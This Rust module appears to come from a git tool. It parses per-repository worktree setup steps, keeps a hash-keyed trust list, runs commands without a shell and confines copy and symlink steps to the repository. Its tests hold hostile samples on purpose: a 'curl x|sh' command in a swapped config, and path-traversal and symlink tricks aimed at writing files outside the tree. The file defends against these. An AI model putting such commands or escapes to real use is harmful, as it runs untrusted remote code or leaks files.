//! Typed post-create / pre-remove worktree steps + trust (issue #341, ADR-0161).
//!
//! Three concerns live here, all in the git layer because kagi-domain must stay
//! dependency-free:
//!
//! 1. **Parse** `.kagi/worktree.toml` (`toml`) into the pure
//!    [`kagi_domain::worktree_steps::WorktreeSteps`] model, plus the SHA-256
//!    (`sha2`/`hex`) of its raw bytes and its canonical path — the trust key.
//! 2. **Trust store** (`trusted_worktree_configs`) — a repo-level allow-list
//!    keyed by `(canonical config path, SHA-256)`. A committed config is
//!    **untrusted by default** (the gwq v0.1.0 ACE lesson); changing its
//!    content changes the SHA and forces a re-confirm.
//! 3. **Executor** — `copy`/`symlink` are self-implemented and need no trust;
//!    `command` shells out through an argv array (never a shell) with a hardened
//!    git-config environment (ADR-0146's lesson) and a timeout that kills the
//!    child (issue #294). A `command` is **never** run untrusted, and **never**
//!    run under the headless harness (assert).

use std::path::{Path, PathBuf};
use std::time::Duration;

use sha2::{Digest, Sha256};

use super::worktree_paths::{reject_escaping_relative, resolve_contained};
use super::GitError;
use kagi_domain::worktree_steps::{WorktreeStep, WorktreeSteps};

const COMMAND_TIMEOUT_SECS: u64 = 600; // `npm ci` can take minutes; kill past 10m.
const CONFIG_REL_PATH: &str = ".kagi/worktree.toml";

// ────────────────────────────────────────────────────────────
// config parse + hash
// ────────────────────────────────────────────────────────────

/// A parsed, hashed, canonically-located `.kagi/worktree.toml`.
#[derive(Debug, Clone)]
pub struct LoadedWorktreeConfig {
    pub steps: WorktreeSteps,
    /// Canonical absolute path of the config file — half the trust key.
    pub canonical_path: PathBuf,
    /// Lowercase hex SHA-256 of the file's raw bytes — the other half. Content
    /// change ⇒ new hash ⇒ trust must be re-confirmed.
    pub sha256: String,
}

/// Load `<root>/.kagi/worktree.toml` if present. `Ok(None)` when absent (the
/// common case); `Err` only on an unreadable or malformed file.
pub fn load_worktree_config(root: &Path) -> Result<Option<LoadedWorktreeConfig>, GitError> {
    let path = root.join(CONFIG_REL_PATH);
    let bytes = match std::fs::read(&path) {
        Ok(b) => b,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(e) => {
            return Err(GitError::Other(format!(
                "cannot read {}: {e}",
                path.display()
            )))
        }
    };
    let sha256 = hex::encode(Sha256::digest(&bytes));
    let text = String::from_utf8(bytes)
        .map_err(|_| GitError::Other(format!("{} is not valid UTF-8", path.display())))?;
    let steps = parse_steps(&text)
        .map_err(|e| GitError::Other(format!("{} is invalid: {e}", path.display())))?;
    // Canonicalize so the trust key is stable regardless of how the repo was
    // opened (symlinks, `..`, relative paths).
    let canonical_path = std::fs::canonicalize(&path).unwrap_or(path);
    Ok(Some(LoadedWorktreeConfig {
        steps,
        canonical_path,
        sha256,
    }))
}

/// Parse the two step arrays out of a `toml::Value` without a serde-derive dep
/// (kagi-git has no serde derive). Unknown `type`s and missing fields are hard
/// errors so a typo never silently drops a step.
fn parse_steps(text: &str) -> Result<WorktreeSteps, String> {
    let value: toml::Value = text.parse().map_err(|e| format!("{e}"))?;
    Ok(WorktreeSteps {
        post_create: parse_phase(&value, "post_create")?,
        pre_remove: parse_phase(&value, "pre_remove")?,
    })
}

fn parse_phase(root: &toml::Value, key: &str) -> Result<Vec<WorktreeStep>, String> {
    let Some(array) = root.get(key) else {
        return Ok(Vec::new());
    };
    let array = array
        .as_array()
        .ok_or_else(|| format!("`{key}` must be an array of tables"))?;
    let mut out = Vec::with_capacity(array.len());
    for (i, item) in array.iter().enumerate() {
        out.push(parse_step(item, key, i)?);
    }
    Ok(out)
}

fn parse_step(item: &toml::Value, key: &str, i: usize) -> Result<WorktreeStep, String> {
    let field = |name: &str| -> Result<String, String> {
        item.get(name)
            .and_then(|v| v.as_str())
            .map(str::to_string)
            .ok_or_else(|| format!("`{key}[{i}]` is missing string field `{name}`"))
    };
    match item.get("type").and_then(|v| v.as_str()) {
        Some("copy") => Ok(WorktreeStep::Copy {
            from: field("from")?,
            to: field("to")?,
        }),
        Some("symlink") => Ok(WorktreeStep::Symlink {
            from: field("from")?,
            to: field("to")?,
        }),
        Some("command") => Ok(WorktreeStep::Command { run: field("run")? }),
        Some(other) => Err(format!(
            "`{key}[{i}]` has unknown type `{other}` (expected copy/symlink/command)"
        )),
        None => Err(format!("`{key}[{i}]` is missing string field `type`")),
    }
}

// ────────────────────────────────────────────────────────────
// trust store — trusted_worktree_configs
// ────────────────────────────────────────────────────────────

/// Path to the `trusted_worktree_configs.json` allow-list. Mirrors the oplog's
/// resolution: `$KAGI_LOG_DIR` (test isolation) then `$HOME/.kagi`.
fn trust_store_path() -> Option<PathBuf> {
    if let Ok(dir) = std::env::var("KAGI_LOG_DIR") {
        if !dir.is_empty() {
            return Some(PathBuf::from(dir).join("trusted_worktree_configs.json"));
        }
    }
    std::env::var("HOME")
        .ok()
        .or_else(|| std::env::var("USERPROFILE").ok())
        .filter(|s| !s.is_empty())
        .map(|home| {
            PathBuf::from(home)
                .join(".kagi")
                .join("trusted_worktree_configs.json")
        })
}

fn read_trust_entries() -> Vec<(String, String)> {
    let Some(path) = trust_store_path() else {
        return Vec::new();
    };
    let Ok(text) = std::fs::read_to_string(&path) else {
        return Vec::new();
    };
    let Ok(serde_json::Value::Array(items)) = serde_json::from_str::<serde_json::Value>(&text)
    else {
        return Vec::new();
    };
    items
        .into_iter()
        .filter_map(|v| {
            let p = v.get("path")?.as_str()?.to_string();
            let s = v.get("sha")?.as_str()?.to_string();
            Some((p, s))
        })
        .collect()
}

/// True when `(config path, sha)` is in the allow-list. A content change moves
/// the SHA and this returns false — forcing a re-confirm (issue #341 §5).
pub fn is_worktree_config_trusted(cfg: &LoadedWorktreeConfig) -> bool {
    let key = cfg.canonical_path.to_string_lossy();
    read_trust_entries()
        .iter()
        .any(|(p, s)| p.as_str() == key && *s == cfg.sha256)
}

/// Record `(config path, sha)` as trusted. Idempotent; entries for the same
/// path with a stale SHA are replaced so the file does not grow unbounded.
pub fn trust_worktree_config(cfg: &LoadedWorktreeConfig) -> Result<(), GitError> {
    let Some(path) = trust_store_path() else {
        return Err(GitError::Other(
            "cannot locate the trust store (no KAGI_LOG_DIR or HOME)".to_string(),
        ));
    };
    let key = cfg.canonical_path.to_string_lossy().to_string();
    let mut entries = read_trust_entries();
    entries.retain(|(p, _)| p != &key);
    entries.push((key, cfg.sha256.clone()));

    let json = serde_json::Value::Array(
        entries
            .into_iter()
            .map(|(p, s)| serde_json::json!({ "path": p, "sha": s }))
            .collect(),
    );
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)
            .map_err(|e| GitError::Other(format!("cannot create trust store dir: {e}")))?;
    }
    std::fs::write(
        &path,
        serde_json::to_string_pretty(&json).unwrap_or_default(),
    )
    .map_err(|e| GitError::Other(format!("cannot write trust store: {e}")))
}

// ────────────────────────────────────────────────────────────
// executor
// ────────────────────────────────────────────────────────────

/// Where a step runs: `main_root` is the source (main worktree) for copy/
/// symlink; `worktree` is the freshly-created / to-be-removed worktree and the
/// working directory for commands.
pub struct StepEnv {
    pub main_root: PathBuf,
    pub worktree: PathBuf,
}

/// True unless the headless `KAGI_*` test harness is active. A `command` is
/// **never** executed under headless (issue #341 §6). `KAGI_LOG_DIR` is
/// deliberately excluded: it is only test-isolation for the store and unit
/// tests, and gating on it would make the trusted-command path untestable.
fn command_execution_allowed() -> bool {
    const HEADLESS_SIGNALS: &[&str] = &[
        "KAGI_OPEN_REPO",
        "KAGI_MENU_DUMP",
        "KAGI_SELECT_FIRST",
        "KAGI_NO_SINGLE_INSTANCE",
    ];
    !HEADLESS_SIGNALS
        .iter()
        .any(|k| std::env::var_os(k).is_some())
}

/// Run the `post_create` steps best-effort: the worktree already exists, so a
/// step failure is never allowed to undo it. `copy`/`symlink` always run;
/// `command` runs only when `trusted` and not headless. Returns a human summary
/// of what happened, for the oplog.
pub fn run_post_create(steps: &[WorktreeStep], env: &StepEnv, trusted: bool) -> Vec<String> {
    let mut log = Vec::new();
    for step in steps {
        let line = match step {
            WorktreeStep::Copy { from, to } => match do_copy(env, from, to) {
                Ok(()) => format!("copy ok: {from} → {to}"),
                Err(e) => format!("copy failed: {from} → {to}: {e}"),
            },
            WorktreeStep::Symlink { from, to } => match do_symlink(env, from, to) {
                Ok(()) => format!("symlink ok: {to} → {from}"),
                Err(e) => format!("symlink failed: {to} → {from}: {e}"),
            },
            WorktreeStep::Command { run } => {
                if !command_execution_allowed() {
                    format!("command skipped (headless): {run}")
                } else if !trusted {
                    format!("command skipped (untrusted): {run}")
                } else {
                    match do_command(env, run) {
                        Ok(()) => format!("command ok: {run}"),
                        Err(e) => format!("command failed: {run}: {e}"),
                    }
                }
            }
        };
        log.push(line);
    }
    log
}

/// Run the `pre_remove` steps as a **precondition of deletion**: any failure —
/// a copy/symlink error, or a `command` that fails, is untrusted, or is blocked
/// by headless — returns `Err`, and the caller must then abort the removal so
/// the worktree survives (issue #341 §5, matching kagi's preflight ethos).
pub fn run_pre_remove(
    steps: &[WorktreeStep],
    env: &StepEnv,
    trusted: bool,
) -> Result<(), GitError> {
    for step in steps {
        match step {
            WorktreeStep::Copy { from, to } => do_copy(env, from, to)?,
            WorktreeStep::Symlink { from, to } => do_symlink(env, from, to)?,
            WorktreeStep::Command { run } => {
                if !command_execution_allowed() {
                    return Err(GitError::Other(format!(
                        "pre-remove command cannot run under the headless harness, so cleanup \
                         cannot be verified — aborting removal: {run}"
                    )));
                }
                if !trusted {
                    return Err(GitError::Other(format!(
                        "pre-remove command is not trusted, so it will not run — aborting \
                         removal (trust .kagi/worktree.toml first): {run}"
                    )));
                }
                do_command(env, run)?;
            }
        }
    }
    Ok(())
}

/// Copy `from` (in the main worktree) to `to` (in the worktree). Never
/// overwrites an existing destination.
///
/// Path-confined (issue #392): `from` must resolve to a real file inside the
/// main worktree and `to` to a location inside the new worktree — after symlink
/// resolution, so neither an absolute path, a `..`, nor a symlink can read from
/// or write to anywhere outside the repo boundary. `Copy`'s "closed side
/// effects" (the reason it needs no trust prompt) are what these checks enforce.
fn do_copy(env: &StepEnv, from: &str, to: &str) -> Result<(), GitError> {
    reject_escaping_relative("copy source", from)?;
    reject_escaping_relative("copy destination", to)?;
    let main = canonical_boundary(&env.main_root)?;
    let wt = canonical_boundary(&env.worktree)?;

    let src = resolve_contained(&main, &main.join(from))?;
    let dst_lexical = wt.join(to);
    // No overwrite; lstat so an existing symlink counts too (never followed).
    if std::fs::symlink_metadata(&dst_lexical).is_ok() {
        return Err(GitError::Other(format!(
            "destination '{}' already exists (copy never overwrites)",
            dst_lexical.display()
        )));
    }
    let dst = resolve_contained(&wt, &dst_lexical)?;
    if let Some(parent) = dst.parent() {
        std::fs::create_dir_all(parent)
            .map_err(|e| GitError::Other(format!("cannot create '{}': {e}", parent.display())))?;
    }
    std::fs::copy(&src, &dst).map(|_| ()).map_err(|e| {
        GitError::Other(format!(
            "copy '{}' → '{}': {e}",
            src.display(),
            dst.display()
        ))
    })
}

/// Canonicalize a boundary directory (main worktree / new worktree) so the
/// containment prefix check is reliable. Both exist while steps run.
fn canonical_boundary(dir: &Path) -> Result<PathBuf, GitError> {
    std::fs::canonicalize(dir)
        .map_err(|e| GitError::Other(format!("'{}' is not accessible: {e}", dir.display())))
}

/// Create a symlink at `to` (in the worktree) pointing at the **absolute** path
/// of `from` (in the main worktree). The four worktree-link safety rules
/// (issue #341 §5): a directory is one link (symlinks never recurse); the
/// target is absolute; `.git` is always excluded; an existing destination is
/// **never overwritten** (asserted).
fn do_symlink(env: &StepEnv, from: &str, to: &str) -> Result<(), GitError> {
    if Path::new(from)
        .components()
        .any(|c| c.as_os_str() == ".git")
        || Path::new(to).components().any(|c| c.as_os_str() == ".git")
    {
        return Err(GitError::Other(
            "symlink refuses any path containing '.git'".to_string(),
        ));
    }
    // Path-confined (issue #392): neither the target nor the link may escape the
    // repo boundary — no absolute path, no `..`, no symlinked parent.
    reject_escaping_relative("symlink source", from)?;
    reject_escaping_relative("symlink destination", to)?;
    let main = canonical_boundary(&env.main_root)?;
    let wt = canonical_boundary(&env.worktree)?;
    // Absolute target, canonicalized so the link survives a relative-CWD chdir,
    // and proven to stay inside the main worktree.
    let target = resolve_contained(&main, &main.join(from))?;
    let link_lexical = wt.join(to);
    // Never overwrite (symlink_metadata: do not follow — an existing symlink
    // counts too).
    if std::fs::symlink_metadata(&link_lexical).is_ok() {
        return Err(GitError::Other(format!(
            "symlink destination '{}' already exists (never overwritten)",
            link_lexical.display()
        )));
    }
    let link = resolve_contained(&wt, &link_lexical)?;
    if let Some(parent) = link.parent() {
        std::fs::create_dir_all(parent)
            .map_err(|e| GitError::Other(format!("cannot create '{}': {e}", parent.display())))?;
    }
    symlink_impl(&target, &link)
}

#[cfg(unix)]
fn symlink_impl(target: &Path, link: &Path) -> Result<(), GitError> {
    std::os::unix::fs::symlink(target, link).map_err(|e| {
        GitError::Other(format!(
            "symlink '{}' → '{}': {e}",
            link.display(),
            target.display()
        ))
    })
}

#[cfg(not(unix))]
fn symlink_impl(_target: &Path, _link: &Path) -> Result<(), GitError> {
    Err(GitError::Other(
        "symlink steps are only supported on Unix".to_string(),
    ))
}

/// Run one `command` step: argv array (never a shell), with a hardened git
/// environment (ADR-0146's lesson: a hostile committed config must not poison
/// the child's git) and a timeout that kills the child (issue #294). The
/// process PATH already carries the login-shell PATH (see `shell_env.rs`), so
/// tools like `npm` resolve.
fn do_command(env: &StepEnv, run: &str) -> Result<(), GitError> {
    use std::io::Read;
    use std::process::{Command, Stdio};

    // Whitespace argv split — no shell, so there is no quoting/expansion.
    // ponytail: no shell-words parsing; add it if quoted args in `run` are
    // needed. A shell is deliberately never used (that is the gwq attack path).
    let mut parts = run.split_whitespace();
    let program = parts
        .next()
        .ok_or_else(|| GitError::Other("empty command step".to_string()))?;
    let args: Vec<&str> = parts.collect();

    let mut child = Command::new(program)
        .args(&args)
        .current_dir(&env.worktree)
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("GIT_TERMINAL_PROMPT", "0")
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| GitError::Other(format!("failed to start '{program}': {e}")))?;

    // Drain stdout and stderr on dedicated threads so a command that emits more
    // than one pipe buffer (~64 KiB — e.g. `npm ci`) can never deadlock in
    // write(2) while we wait for it to exit (issues #294/#403): the readers keep
    // draining regardless of what the wait loop is doing. Mirrors `cli::run_git`.
    // ponytail: kills only the direct child, not its process group — a `command`
    // whose grandchildren outlive it (node/docker) can still leak. Killing the
    // group is a platform-specific follow-up; the deadlock is the P1 here.
    let mut out_pipe = child.stdout.take();
    let mut err_pipe = child.stderr.take();
    let out_reader = std::thread::spawn(move || {
        let mut buf = Vec::new();
        if let Some(p) = out_pipe.as_mut() {
            let _ = p.read_to_end(&mut buf);
        }
        buf
    });
    let err_reader = std::thread::spawn(move || {
        let mut buf = Vec::new();
        if let Some(p) = err_pipe.as_mut() {
            let _ = p.read_to_end(&mut buf);
        }
        buf
    });

    // Killing on timeout closes the pipes, which unblocks the reader threads so
    // they join cleanly.
    let status = crate::cli::wait_or_kill(&mut child, Duration::from_secs(COMMAND_TIMEOUT_SECS));
    let stdout = String::from_utf8_lossy(&out_reader.join().unwrap_or_default()).into_owned();
    let stderr = String::from_utf8_lossy(&err_reader.join().unwrap_or_default()).into_owned();

    let Some(status) = status else {
        return Err(GitError::Other(format!(
            "command '{run}' timed out after {COMMAND_TIMEOUT_SECS}s and was killed{}",
            output_tail(&stdout, &stderr)
        )));
    };
    if status.success() {
        Ok(())
    } else {
        Err(GitError::Other(format!(
            "command '{run}' exited with status {}{}",
            status.code().unwrap_or(-1),
            output_tail(&stdout, &stderr)
        )))
    }
}

/// The tail of a failed command's output (stderr, else stdout) for the error /
/// oplog line — the diagnostic that was previously discarded (issue #403).
/// Empty when both streams were empty.
fn output_tail(stdout: &str, stderr: &str) -> String {
    let src = if !stderr.trim().is_empty() {
        stderr
    } else {
        stdout
    };
    let trimmed = src.trim();
    if trimmed.is_empty() {
        return String::new();
    }
    const MAX_CHARS: usize = 800;
    let count = trimmed.chars().count();
    if count > MAX_CHARS {
        let tail: String = trimmed.chars().skip(count - MAX_CHARS).collect();
        format!(" — output tail: …{tail}")
    } else {
        format!(" — output: {trimmed}")
    }
}

// ────────────────────────────────────────────────────────────
// plan enumeration helpers (shared by create + remove plans)
// ────────────────────────────────────────────────────────────

use kagi_domain::plan_note::{PlanNote, WorktreeNote};

/// Load `<root>/.kagi/worktree.toml` and record it as trusted. The UI calls
/// this when the user confirms a create / remove plan whose step note is
/// `trust_required` — the visible, escaped command list in that plan is the
/// informed-consent prompt (issue #341 §5). No-op (Ok) when there is no config.
/// `expected_sha` is the SHA-256 the plan note displayed. Trust is granted only
/// if the on-disk config still hashes to it — so a config swapped between the
/// plan (display A) and confirm (content B) is refused rather than silently
/// trusted (issue #393 TOCTOU). Never trusts, and returns `Err`, on mismatch or
/// disappearance.
pub fn trust_worktree_config_at(root: &Path, expected_sha: &str) -> Result<(), GitError> {
    match load_worktree_config(root)? {
        Some(cfg) if cfg.sha256 == expected_sha => trust_worktree_config(&cfg),
        Some(_) => Err(worktree_config_changed_err()),
        None => Err(GitError::Other(
            "the worktree config was removed after it was shown in the plan — re-open the dialog \
             to review it before continuing"
                .to_string(),
        )),
    }
}

fn worktree_config_changed_err() -> GitError {
    GitError::Other(
        "the .kagi/worktree.toml changed after it was shown in the plan — refusing to trust or run \
         the new content; re-open the create/remove dialog to review it (issue #393)"
            .to_string(),
    )
}

/// The config SHA-256 the plan displayed in its post-create / pre-remove note,
/// if any. `None` when the plan carried no such note. Used to bind trust and
/// execution to exactly the content the user saw (issue #393).
pub fn plan_worktree_config_sha(plan: &kagi_domain::plan::OperationPlan) -> Option<&str> {
    plan.warnings
        .iter()
        .chain(plan.blockers.iter())
        .find_map(|n| match n {
            PlanNote::Worktree(WorktreeNote::PostCreateSteps { sha256, .. })
            | PlanNote::Worktree(WorktreeNote::PreRemoveSteps { sha256, .. }) => {
                Some(sha256.as_str())
            }
            _ => None,
        })
}

/// Verify the on-disk config at `root` still hashes to `expected` (what the plan
/// showed). `Err` when it changed or vanished — the execute-side half of the
/// TOCTOU closure (issue #393).
pub fn verify_worktree_config_sha(root: &Path, expected: &str) -> Result<(), GitError> {
    match load_worktree_config(root)? {
        Some(cfg) if cfg.sha256 == expected => Ok(()),
        Some(_) | None => Err(worktree_config_changed_err()),
    }
}

/// True when `plan` carries a `PostCreateSteps` / `PreRemoveSteps` note that is
/// still `trust_required` — i.e. confirming it should grant trust. Lets the UI
/// decide without reaching into the note variants itself.
pub fn plan_requires_worktree_trust(plan: &kagi_domain::plan::OperationPlan) -> bool {
    plan.warnings.iter().chain(plan.blockers.iter()).any(|n| {
        matches!(
            n,
            PlanNote::Worktree(WorktreeNote::PostCreateSteps {
                trust_required: true,
                ..
            }) | PlanNote::Worktree(WorktreeNote::PreRemoveSteps {
                trust_required: true,
                ..
            })
        )
    })
}

/// Build the `PostCreateSteps` plan note for a loaded config, computing
/// `trust_required` from the live trust store. `None` when there are no
/// post-create steps.
pub fn post_create_note(cfg: &LoadedWorktreeConfig) -> Option<PlanNote> {
    if cfg.steps.post_create.is_empty() {
        return None;
    }
    let trust_required = cfg.steps.post_create_needs_trust() && !is_worktree_config_trusted(cfg);
    Some(PlanNote::Worktree(WorktreeNote::PostCreateSteps {
        steps: cfg.steps.post_create.clone(),
        trust_required,
        sha256: cfg.sha256.clone(),
    }))
}

/// Build the `PreRemoveSteps` plan note for a loaded config. `None` when there
/// are no pre-remove steps.
pub fn pre_remove_note(cfg: &LoadedWorktreeConfig) -> Option<PlanNote> {
    if cfg.steps.pre_remove.is_empty() {
        return None;
    }
    let trust_required = cfg.steps.pre_remove_needs_trust() && !is_worktree_config_trusted(cfg);
    Some(PlanNote::Worktree(WorktreeNote::PreRemoveSteps {
        steps: cfg.steps.pre_remove.clone(),
        trust_required,
        sha256: cfg.sha256.clone(),
    }))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_all_three_types() {
        let toml = r#"
[[post_create]]
type = "copy"
from = ".env.example"
to = ".env"

[[post_create]]
type = "symlink"
from = ".claude"
to = ".claude"

[[post_create]]
type = "command"
run = "npm ci"

[[pre_remove]]
type = "command"
run = "docker compose down"
"#;
        let steps = parse_steps(toml).unwrap();
        assert_eq!(steps.post_create.len(), 3);
        assert_eq!(steps.pre_remove.len(), 1);
        assert!(steps.post_create_needs_trust());
        assert!(steps.pre_remove_needs_trust());
    }

    #[test]
    fn parse_rejects_unknown_type() {
        let toml = "[[post_create]]\ntype = \"exec\"\nrun = \"x\"\n";
        assert!(parse_steps(toml).is_err());
    }

    #[test]
    fn parse_rejects_missing_field() {
        let toml = "[[post_create]]\ntype = \"copy\"\nfrom = \"a\"\n";
        assert!(parse_steps(toml).is_err());
    }

    // ── issue #392: copy/symlink steps are confined to the repo boundary ──

    /// A main-root + worktree pair plus an outside directory, all real dirs.
    fn containment_fixture() -> (tempfile::TempDir, PathBuf, PathBuf, PathBuf) {
        let root = tempfile::tempdir().unwrap();
        let main = root.path().join("main");
        let wt = root.path().join("wt");
        let outside = root.path().join("outside");
        std::fs::create_dir_all(&main).unwrap();
        std::fs::create_dir_all(&wt).unwrap();
        std::fs::create_dir_all(&outside).unwrap();
        (root, main, wt, outside)
    }

    #[test]
    fn do_copy_refuses_absolute_paths_both_directions() {
        let (_root, main, wt, outside) = containment_fixture();
        let secret = outside.join("secret");
        std::fs::write(&secret, "TOP-SECRET").unwrap();
        let env = StepEnv {
            main_root: main.clone(),
            worktree: wt.clone(),
        };
        // Absolute source (read escape) and absolute dest (write escape).
        let exfil = outside.join("stolen");
        assert!(do_copy(&env, secret.to_str().unwrap(), exfil.to_str().unwrap()).is_err());
        assert!(
            !exfil.exists(),
            "nothing may be written outside the worktree"
        );
        // A legit in-repo source with an absolute dest is still refused.
        std::fs::write(main.join("a.txt"), "ok").unwrap();
        assert!(do_copy(&env, "a.txt", exfil.to_str().unwrap()).is_err());
        assert!(!exfil.exists());
    }

    #[test]
    fn do_copy_refuses_dotdot_traversal() {
        let (_root, main, wt, outside) = containment_fixture();
        std::fs::write(main.join("a.txt"), "ok").unwrap();
        let env = StepEnv {
            main_root: main,
            worktree: wt,
        };
        // `to` climbs out of the worktree via `..`.
        assert!(do_copy(&env, "a.txt", "../outside/stolen").is_err());
        assert!(!outside.join("stolen").exists());
    }

    #[test]
    #[cfg(unix)]
    fn do_copy_refuses_symlinked_parent_dest() {
        let (_root, main, wt, outside) = containment_fixture();
        std::fs::write(main.join("a.txt"), "ok").unwrap();
        // A symlink inside the worktree pointing at an outside dir (issue #419
        // variant B analogue for the .toml path).
        std::os::unix::fs::symlink(&outside, wt.join("link")).unwrap();
        let env = StepEnv {
            main_root: main,
            worktree: wt,
        };
        assert!(do_copy(&env, "a.txt", "link/stolen").is_err());
        assert!(!outside.join("stolen").exists());
    }

    #[test]
    #[cfg(unix)]
    fn do_copy_refuses_symlinked_source_out_of_tree() {
        let (_root, main, wt, outside) = containment_fixture();
        let secret = outside.join("secret");
        std::fs::write(&secret, "TOP-SECRET").unwrap();
        std::os::unix::fs::symlink(&secret, main.join("leak")).unwrap();
        let env = StepEnv {
            main_root: main,
            worktree: wt.clone(),
        };
        assert!(do_copy(&env, "leak", "stolen").is_err());
        assert!(!wt.join("stolen").exists());
    }

    #[test]
    fn do_copy_allows_in_repo_copy() {
        let (_root, main, wt, _outside) = containment_fixture();
        std::fs::write(main.join("a.txt"), "hello").unwrap();
        let env = StepEnv {
            main_root: main,
            worktree: wt.clone(),
        };
        do_copy(&env, "a.txt", "b.txt").expect("in-repo copy must succeed");
        assert_eq!(std::fs::read_to_string(wt.join("b.txt")).unwrap(), "hello");
    }

    #[test]
    #[cfg(unix)]
    fn do_symlink_refuses_escapes_both_directions() {
        let (_root, main, wt, outside) = containment_fixture();
        std::fs::write(main.join("a.txt"), "ok").unwrap();
        let env = StepEnv {
            main_root: main.clone(),
            worktree: wt.clone(),
        };
        // Absolute dest escape.
        let drop = outside.join("linkdrop");
        assert!(do_symlink(&env, "a.txt", drop.to_str().unwrap()).is_err());
        assert!(std::fs::symlink_metadata(&drop).is_err());
        // `..` dest escape.
        assert!(do_symlink(&env, "a.txt", "../outside/linkdrop2").is_err());
        assert!(std::fs::symlink_metadata(outside.join("linkdrop2")).is_err());
        // Absolute source escape.
        let secret = outside.join("secret");
        std::fs::write(&secret, "x").unwrap();
        assert!(do_symlink(&env, secret.to_str().unwrap(), "here").is_err());
        assert!(std::fs::symlink_metadata(wt.join("here")).is_err());
    }

    #[test]
    #[cfg(unix)]
    fn do_symlink_allows_in_repo_link() {
        let (_root, main, wt, _outside) = containment_fixture();
        std::fs::write(main.join("a.txt"), "ok").unwrap();
        let env = StepEnv {
            main_root: main,
            worktree: wt.clone(),
        };
        do_symlink(&env, "a.txt", "link").expect("in-repo symlink must succeed");
        assert!(std::fs::symlink_metadata(wt.join("link"))
            .unwrap()
            .file_type()
            .is_symlink());
    }

    // ── issue #403: a command that fills the pipe buffer must not deadlock ──

    #[test]
    #[cfg(unix)]
    fn do_command_drains_large_output_without_deadlock() {
        let (_root, main, wt, _outside) = containment_fixture();
        let env = StepEnv {
            main_root: main,
            worktree: wt,
        };
        // `seq 1 200000` writes ~1.2 MB to stdout, far exceeding the ~64 KiB pipe
        // buffer. Without a concurrent drain the child blocks in write(2) and
        // wait_or_kill only returns after the 600s timeout (issue #403). With the
        // reader threads it finishes near-instantly.
        let start = std::time::Instant::now();
        do_command(&env, "seq 1 200000").expect("large-output command must complete, not deadlock");
        assert!(
            start.elapsed() < std::time::Duration::from_secs(30),
            "command deadlocked on a full pipe buffer (issue #403)"
        );
    }

    #[test]
    #[cfg(unix)]
    fn do_command_reports_output_tail_on_failure() {
        let (_root, main, wt, _outside) = containment_fixture();
        let env = StepEnv {
            main_root: main,
            worktree: wt,
        };
        // `ls` on a missing path exits non-zero and writes to stderr; the tail
        // must reach the error (issue #403: output was previously discarded).
        let err = do_command(&env, "ls /no/such/path/kagi-403").unwrap_err();
        let msg = format!("{err:?}");
        assert!(msg.contains("exited with status"), "got: {msg}");
        assert!(
            msg.contains("output"),
            "the captured tail must surface: {msg}"
        );
    }

    // ── issue #393: trust / execute bind to the exact plan-shown content ──

    fn write_config(root: &Path, body: &str) -> String {
        let dir = root.join(".kagi");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("worktree.toml"), body).unwrap();
        load_worktree_config(root).unwrap().unwrap().sha256
    }

    #[test]
    fn verify_refuses_config_changed_after_plan() {
        let root = tempfile::tempdir().unwrap();
        let sha_a = write_config(
            root.path(),
            "[[post_create]]\ntype=\"command\"\nrun=\"echo a\"\n",
        );
        // Unchanged content verifies.
        verify_worktree_config_sha(root.path(), &sha_a).expect("same content must verify");
        // Content swapped (display A / execute B) is refused.
        let sha_b = write_config(
            root.path(),
            "[[post_create]]\ntype=\"command\"\nrun=\"curl x|sh\"\n",
        );
        assert_ne!(sha_a, sha_b);
        assert!(
            verify_worktree_config_sha(root.path(), &sha_a).is_err(),
            "a config changed since planning must be refused"
        );
        verify_worktree_config_sha(root.path(), &sha_b)
            .expect("new sha verifies against new content");
    }

    #[test]
    fn trust_refuses_config_changed_after_plan() {
        let root = tempfile::tempdir().unwrap();
        let sha_a = write_config(
            root.path(),
            "[[post_create]]\ntype=\"command\"\nrun=\"echo a\"\n",
        );
        // Swap content; granting trust against the stale (plan-shown) sha refuses
        // and never records trust for the new content.
        write_config(
            root.path(),
            "[[post_create]]\ntype=\"command\"\nrun=\"curl x|sh\"\n",
        );
        assert!(trust_worktree_config_at(root.path(), &sha_a).is_err());
    }
}
